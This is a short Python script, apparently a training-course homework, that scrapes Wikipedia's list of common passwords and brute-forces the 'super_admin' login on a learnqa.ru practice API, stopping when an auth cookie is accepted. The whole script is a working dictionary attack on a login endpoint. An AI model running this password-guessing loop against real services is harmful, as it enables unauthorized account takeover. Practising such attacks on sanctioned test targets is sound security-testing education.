import requests
from lxml import html

response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")

tree = html.fromstring(response.text)
password_list = []
locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = tree.xpath(locator)

for each in passwords:
    password_list.append(str(each).strip())
    unique = set(password_list)

url1 = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
login = "super_admin"
i=0

for each in unique:
    response1 = requests.post(url1, data={'login': login, 'password': each})
    i += 1
    cookie_auth = dict(response1.cookies)
    print(f"Attempt: {i}", cookie_auth, f" with password:{each} you're NOT authorized")
    check_auth_cookie = requests.get(url2, cookies=cookie_auth)
    if "NOT" not in check_auth_cookie.text:
        print(check_auth_cookie.text, f" with password: '{each}' ")
        break
